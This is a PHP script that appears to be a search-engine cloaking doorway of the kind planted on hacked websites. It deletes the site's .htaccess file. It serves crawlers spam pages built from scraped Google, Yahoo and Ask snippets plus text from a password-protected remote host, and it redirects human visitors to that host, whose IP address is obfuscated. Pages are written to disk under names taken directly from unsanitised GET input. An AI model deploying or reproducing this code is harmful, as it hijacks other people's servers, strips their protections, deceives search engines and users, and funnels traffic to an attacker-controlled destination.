<?php

$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
$ff = $f1.$f2.$f3;

if (file_exists($ff)) chmod ($ff, 0777);
if (file_exists($ff)) unlink ($ff);	

foreach ($_GET as $a=>$b)
{
	$_GET["id"] = $b;
}

$x1=5;
$xx1=141;
$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}



if ($isbot)
{
	
	//$myname  = basename($_SERVER['SCRIPT_NAME'], ".php");	
	$myname = $_GET["id"].".php";
	if (file_exists($myname))
	{
	$html = file($myname);
	$html = implode($html, "");
	echo $html;
	exit;
	}
	
	//if (!strpos($_SERVER['HTTP_USER_AGENT'], "google")) exit;
	/*
	while($tpl == 0)
	{
$tpl_n = rand(1,9);
$tpl = @file("tpl$tpl_n.html");
	}
*/
$tpl = file("tpl7.html");
$keyword = "7";
$keyword = str_replace("-", " ", $_GET["id"]);
$keyword = chop($keyword);
$keyword = ucfirst($keyword);


 $query_pars = $keyword;
 $query_pars_2 = str_replace(" ", "+", chop($query_pars));
 $query_pars_2 = mb_strtolower($query_pars_2);

 $text = "";

 $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://$x1.4$x1.79.1$x1/story.php?pass=iojij333jbjbjh333&q=$_GET[id]"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$text = curl_exec($ch); 
curl_close($ch);
 
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "https://www.ask.com/web?q=$query_pars_2&o=0&qo=homepageSearchBox"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // отключение сертификата   
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); // отключение сертификата  

$result = curl_exec($ch); 
curl_close($ch);
$result = str_replace("\r\n", "", $result);
$result = str_replace("\n", "", $result);
preg_match_all ("#PartialSearchResults-item-abstract\">(.*)</p>#iU",$result,$m);
foreach ($m[1] as $a) $text .= $a;


		$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://www.google.com/search?q=$query_pars_2"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.6) Gecko/20060928 Firefox/1.5.0.6');
$result = curl_exec($ch); 
curl_close($ch);
$result = str_replace("\r\n", "", $result);
$result = str_replace("\n", "", $result);
	preg_match_all ("#<span class=\"st\">(.*)</span>#iU",$result,$m);
		foreach ($m[1] as $a) $text .= $a;

	

for ($page=1;$page<3;$page=$page+10)
{
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://search.yahoo.com/search?p=$query_pars_2&fr=yfp-t&fr2=sb-top&fp=1&b=$page&pz=10&bct=0&xargs=0"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$result = curl_exec($ch); 
curl_close($ch);
//echo $result;
		preg_match_all ("#<p class=\"lh-16\">(.*)</p></div>#iU",$result,$m);
		foreach ($m[1] as $a) $text .= $a;	
}
	
$text = str_replace("...", "", $text);
		$text = strip_tags($text); 
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);

		$text = explode(".", $text);
		shuffle($text);
		$text = array_unique($text);
		$text = implode(". ", $text);


     	$html = implode ("\n", $tpl);
/*		
$titlename = $_SERVER['SERVER_NAME'];	
$titlename = explode(".", $titlename);
$titlename = strtoupper($titlename[0]);
if (strlen($titlename)>1) $html=str_replace("<title>{keyword}</title>", "<title>$keyword | $titlename</title>", $html);		
	*/	
		$html = str_replace("{keyword}", $keyword, $html);
		$html = str_replace("{manytext_bing}", $text, $html);
		
		$out = fopen($myname, "w");
		fwrite($out, $html);
		fclose($out);

		echo $html;
		
}	

if(!@$isbot)
{
$tpl = "7";
$keyword = str_replace("-", " ", $_GET["id"]);
$keyword = str_replace(" ", "+", $keyword);

$s = dirname($_SERVER['PHP_SELF']);
if ($s == '\\' | $s == '/') {$s = ('');}  
$s = $_SERVER['SERVER_NAME'] . $s;

$today = "20180127";

header("Location: http://$x1.4$x1.79.1$x1/input/?mark=$today-$s&tpl=$tpl&engkey=$keyword");
//header("Location: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
exit;
}

?>